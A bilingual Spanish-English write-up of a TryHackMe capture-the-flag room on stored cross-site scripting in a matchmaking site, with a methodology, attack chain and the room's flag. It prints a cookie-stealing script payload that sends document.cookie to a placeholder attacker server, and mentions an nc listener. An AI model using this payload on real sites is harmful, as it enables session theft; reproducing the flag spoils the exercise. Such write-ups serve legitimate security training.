# Cupid's Matchmaker [EASY]

### Información de la Sala / Room Information

* **Dificultad / Difficulty:** EASY
* **Tipo / Type:** CTF (Evento "Love at First Breach 2026" - Módulo LAFB CTF 2026)
* **Slug:** `lafb2026e3`
* **Link:** https://tryhackme.com/room/lafb2026e3
* **Sección / Section:** 01 Level Easy
* **Fuente / Source:** Web (API THM `api/v2/rooms/tasks?roomCode=lafb2026e3` + websearch de walkthroughs)

## Solucionario de Tareas / Task Solutions

> **ES:** Sala de evento (Love at First Breach 2026) de dificultad Fácil. El tema es **Cross-Site Scripting almacenado (XSS stored)** en una web de emparejamiento: el mensaje de "interés" o perfil que envías se renderiza sin escapar en el panel que revisa un bot/administrador. El payload se ejecuta en la sesión del revisor y permite robar la cookie del admin o leer el panel donde aparece la flag.
> **EN:** Event room (Love at First Breach 2026) of Easy difficulty. The theme is **stored Cross-Site Scripting (XSS)** in a matchmaking web: the "interest" message or profile you send is rendered without escaping in the panel reviewed by a bot/administrator. The payload runs in the reviewer's session and lets you steal the admin's cookie or read the panel where the flag shows up.

### Task 1 - Admin Review

> **ES:** La web de *matchmaking* permite dejar un mensaje en el perfil/candidatura (campo que se renderiza sin sanitizar). Se inyecta un payload clásico de *script* (por ejemplo `<script>fetch('https://tu-servidor/?c='+document.cookie)</script>`). Un bot de revisión (o el admin) visita la página con la sesión privilegiada: el payload se ejecuta en ese contexto. En el panel del admin (visible tras el robo de cookie/sesión del bot, o directamente en la respuesta tras la revisión) está la flag. 1 pregunta.
> **EN:** The *matchmaking* web lets you leave a message on the profile/application (a field rendered without sanitization). You inject a classic *script* payload (e.g. `<script>fetch('https://your-server/?c='+document.cookie)</script>`). A review bot (or the admin) visits the page with the privileged session: the payload executes in that context. In the admin panel (reached after stealing the bot's cookie/session, or directly in the response after the review) is the flag. 1 question.

| Pregunta / Question | Respuesta / Answer |
|----------|--------|
| What is the flag? | `THM{XSS_CuP1d_Str1k3s_Ag41n}` |

## Metodología / Methodology

1. **Paso / Step - Reconocimiento:** Web de emparejamiento con un campo de mensaje/perfil. Se comprueba que la entrada se refleja sin `htmlspecialchars`/escapado al renderizarla.
2. **Paso / Step - Detección de XSS:** `curl` enviando `<script>alert(1)</script>` y ver la reflexión en crudo en el HTML de la página del perfil/candidatura.
3. **Paso / Step - Payload de exfiltración:** Se sustituye por un payload que hace `fetch` a un listener propio (Burp Collaborator o `nc`) con `document.cookie`; queda **almacenado** en la web.
4. **Paso / Step - Revisión del admin:** El bot/admin revisa la candidatura; al cargarla ejecuta el script con la sesión privilegiada y envía la cookie (o la flag aparece en el panel del admin).
5. **Paso / Step - Flag:** Con la sesión/cookie del admin se accede al panel y se lee `THM{XSS_CuP1d_Str1k3s_Ag41n}`.

### Cadena de ataque / Attack Chain

```
web de emparejamiento -> campo de mensaje sin sanitizar
  -> inyectar <script>fetch(...document.cookie)</script>  [XSS stored]
  -> bot/admin revisa con sesión privilegiada
  -> payload se ejecuta -> cookie/sesión exfiltrada (o panel admin)
  -> panel del admin -> THM{XSS_CuP1d_Str1k3s_Ag41n}
```

**Lección:** Toda entrada debe escaparse al renderizarse; una sola reflexión sin sanitizar + un revisor automático con privilegios convierte un foro inocente en exfiltración de sesión (blind/stored XSS).

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.